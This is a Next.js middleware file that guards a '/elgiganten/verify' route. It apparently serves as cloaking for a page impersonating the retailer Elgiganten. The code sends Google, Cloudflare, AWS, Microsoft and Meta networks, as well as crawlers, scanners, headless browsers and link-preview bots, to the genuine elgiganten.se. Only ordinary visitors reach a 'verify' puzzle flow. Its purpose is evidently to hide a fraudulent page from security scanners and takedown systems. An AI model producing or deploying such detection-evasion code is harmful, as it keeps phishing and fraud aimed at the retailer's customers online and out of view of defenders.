// middleware.ts
import { NextResponse, NextRequest } from "next/server";

export const config = {
  // Run only on the verify flow
  matcher: ["/elgiganten/verify/:path*"],
};

// --- Provider blocklists (ASN + name/domain snippets) ---
const BAD_ASN = new Set<string>([
  // Google
  "AS15169", "AS396982",
  // Cloudflare
  "AS13335",
  // Amazon / AWS
  "AS16509", "AS14618",
  // Microsoft / Azure / Bing
  "AS8075", "AS8068",
  // Meta / Facebook
  "AS32934",
  // Fastly
  "AS54113",
  // Akamai
  "AS20940",
  
  // >>> Your ISP (for testing)
  "AS8708",
]);

const BAD_NAME_SNIPPETS = [
  "google", "google llc", "google cloud", "googlebot",
  "cloudflare", "cloudflare, inc",
  "amazon", "aws", "amazon.com", "amazon technologies",
  "microsoft", "azure", "bing",
  "meta", "facebook", "facebook inc",
  "fastly",
  "akamai",
];

// --- Broad bot/crawler UA detection (incl. Vertex) ---
const BOT_UA =
  /(bot|crawler|spider|crawling|curl|wget|python-requests|httpclient|libwww|urlgrabber|^python|^php|^java|go-http-client|okhttp|feedfetcher|readability|preview|scan|probe|monitor|checker|validator|analyzer|scrape|scraper|headless|phantomjs|slimerjs|puppeteer|playwright|rendertron|facebookexternalhit|facebot|slackbot|twitterbot|linkedinbot|pinterest|discordbot|telegrambot|whatsapp|skypeuripreview|googlebot|adsbot-google|google-read-aloud|google-cloudvertexbot|mediapartners-google|bingbot|bingpreview|yandex|baiduspider|duckduckbot|sogou|seznambot|semrush|ahrefs|mj12bot|dotbot|gigabot|petalbot|applebot|ia_archiver|amazonbot)/i;

const REDIRECT_URL = "https://www.elgiganten.se";

// --- Helpers ---
function getClientIp(req: NextRequest): string | null {
  // Respect proxies/CDN headers (Vercel/CF)
  const fwd = req.headers.get("x-forwarded-for");
  if (fwd) {
    const ip = fwd.split(",")[0]?.trim();
    if (ip) return ip;
  }
  const cf = req.headers.get("cf-connecting-ip");
  if (cf) return cf.trim();
  const xr = req.headers.get("x-real-ip");
  if (xr) return xr.trim();
  return null;
}

async function ipinfoLookup(ip: string, token?: string) {
  if (!token) return null;
  const url = `https://api.ipinfo.io/lite/${encodeURIComponent(ip)}?token=${encodeURIComponent(token)}`;
  const controller = new AbortController();
  const to = setTimeout(() => controller.abort(), 1200);
  try {
    const res = await fetch(url, { signal: controller.signal, cache: "no-store" });
    clearTimeout(to);
    if (!res.ok) return null;
    // IPinfo Lite returns at least ASN on many IPs; when present, we use it.
    return (await res.json()) as {
      asn?: string;
      as_name?: string;
      as_domain?: string;
    };
  } catch {
    clearTimeout(to);
    return null;
  }
}

function matchesBadProviderLite(rec: { asn?: string; as_name?: string; as_domain?: string } | null) {
  if (!rec) return false;
  const { asn, as_name, as_domain } = rec;
  if (asn && BAD_ASN.has(asn.toUpperCase())) return true;
  const name = (as_name || "").toLowerCase();
  const domain = (as_domain || "").toLowerCase();
  return BAD_NAME_SNIPPETS.some((n) => name.includes(n) || domain.includes(n));
}

async function maxmindLookup(req: NextRequest, ip: string) {
  // Call internal API (Node runtime) with a tight timeout
  const controller = new AbortController();
  const to = setTimeout(() => controller.abort(), 1200);
  try {
    const url = new URL("/api/isp-lookup", req.nextUrl.origin);
    url.searchParams.set("ip", ip);
    const res = await fetch(url.toString(), {
      method: "GET",
      signal: controller.signal,
      headers: { "x-mw": "1" }, // trivial guard
      cache: "no-store",
    });
    clearTimeout(to);
    if (!res.ok) return null;
    return (await res.json()) as { isBad?: boolean };
  } catch {
    clearTimeout(to);
    return null;
  }
}

// --- Middleware entrypoint (Edge runtime) ---
export async function middleware(req: NextRequest) {
  // 0) UA block (bots and previews) **before** any page logic
  const ua = req.headers.get("user-agent") || "";
  if (BOT_UA.test(ua)) {
    return NextResponse.redirect(REDIRECT_URL, { status: 302 });
  }

  // 1) IPinfo ASN/AS-name/domain check
  const ip = getClientIp(req);
  if (ip) {
    const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);
    if (matchesBadProviderLite(lite)) {
      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
    }

    // 2) MaxMind ISP DB as a second signal
    const mm = await maxmindLookup(req, ip);
    if (mm?.isBad) {
      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
    }
  }

  // 3) Allow through to the verify page flow (puzzle etc.)
  return NextResponse.next();
}
